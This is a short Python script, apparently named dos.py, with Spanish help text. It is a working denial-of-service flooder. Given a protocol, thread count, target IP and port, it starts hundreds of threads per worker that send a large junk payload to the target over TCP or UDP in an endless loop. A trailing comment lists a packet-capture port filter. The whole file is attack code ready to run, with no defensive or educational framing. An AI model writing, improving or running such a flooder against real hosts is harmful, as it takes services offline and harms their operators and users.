import socket
import time
import threading
import multiprocessing
from sys import argv

try:
	protocolo = str(argv[1])
	if protocolo != 'tcp' and protocolo != 'udp':
		print("introduce un protocolo valido.")
		exit()
	theards = int(argv[2])
	ip = str(argv[3])
	port = int(argv[4])
except IndexError:
	print("""
	
	error de parametros:
	<protocolo>         protocolo a usar: tcp o udp.
	<ip a atacar>       ip del objetivo.
	<puerto>            puerto por el que dirigir el ataque.
	
	python3 dos.py  <protocolo>  <theard>  <ip a atacar>  <puerto>
	
	""")
	exit()

def b():
	def a():
		a = "AAAAAAAAAAAAA" * 100
		a += "\x90" * 100
		ebx ="\x80" * 100
		eax=str(a)+str(ebx) +str("AAAAAAAAAAAAA"*100)

		while True:
			if str(argv[1]) == 'tcp':
				s = socket.socket()
				s.connect((str(argv[3]), int(argv[4])))
			elif str(argv[1]) == 'udp':
				s = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)

			try:

				if str(argv[1]) == 'tcp':
					s.send(eax.encode())
				elif str(argv[1]) == 'udp':		
					s.sendto(eax.encode(),(str(argv[3]), int(argv[4])))
		
				print("atackando, exito al mandar el packete: "+str(argv[1])+" a; "+str(argv[3])+":"+str(argv[4]))

			except BrokenPipeError:

				print("error")
				time.sleep(0.1)

				try:

					if str(argv[1]) == 'tcp':
						s.send(eax.encode())
					elif str(argv[1]) == 'udp':		
						s.sendto(eax.encode(),(str(argv[3]), int(argv[4])))

				except BrokenPipeError:
					pass

			s.close()

	pilaConexiones = []

	for i in range(0, 400):
		hilo = threading.Thread(target=a)
		hilo.start()
		pilaConexiones.append(hilo)

pilaProcesos = []
for f in range(0, int(argv[2])):
	proceso = threading.Thread(target=b)
	proceso.start()
# (tcp.port == 51010 || tcp.port == 51020 || tcp.port == 51030 || tcp.port == 51040 || tcp.port == 52020 || tcp.port == 52030 || tcp.port == 8121 || tcp.port == 52333 || tcp.port == 57395 || tcp.port == 53000 || tcp.port == 25123 || tcp.port == 25124 || tcp.port == 51060 || tcp.port == 52025 || tcp.port == 7100 || tcp.port == 8009 || tcp.port == 8600 || tcp.port == 19198 || tcp.port == 1080 || tcp.port == 1443 || udp.port == 33112 || udp.port == 38072 || udp.port == 50757 || udp.port == 38072 || udp.port == 56302 || udp.port == 54000 || udp.port == 51050)